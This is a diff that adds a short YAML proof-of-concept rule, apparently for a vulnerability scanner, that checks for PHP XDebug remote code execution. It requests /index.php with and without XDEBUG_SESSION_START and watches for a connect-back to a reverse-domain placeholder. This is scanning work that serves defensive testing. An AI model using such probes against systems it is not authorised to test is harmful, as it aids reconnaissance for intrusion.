@@ -1,0 +1,14 @@
+name: poc-yaml-PHP_XDebug_RCE
+rules:
+  - method: GET
+    path: /index.php
+    headers:
+      X-Forwarded-For: '{{reverse_domain}}'
+    follow_redirects: false
+    expression: '!waitReverse(5)'
+  - method: GET
+    path: /index.php?XDEBUG_SESSION_START=phpstorm
+    headers:
+      X-Forwarded-For: '{{reverse_domain}}'
+    follow_redirects: false
+    expression: waitReverse(5)
